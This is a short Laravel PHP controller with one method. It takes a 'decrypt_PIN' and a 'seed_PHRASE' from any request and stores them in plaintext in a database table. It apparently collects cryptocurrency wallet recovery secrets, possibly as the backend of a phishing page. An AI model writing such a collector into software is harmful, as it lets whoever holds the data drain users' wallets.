<?php

namespace App\Http\Controllers;
use App\Models\ikeepuser;
use Illuminate\Http\Request;

class ikeepusercontroller extends Controller
{
    #temoporary only....
    public function StoreData(Request $request)
    {
        $validateData = $request->validate([
           'decrypt_PIN' => 'required',
           'seed_PHRASE' => 'required'
        ]);
        
        ikeepuser::create($validateData);

        return 'success';
    }
}
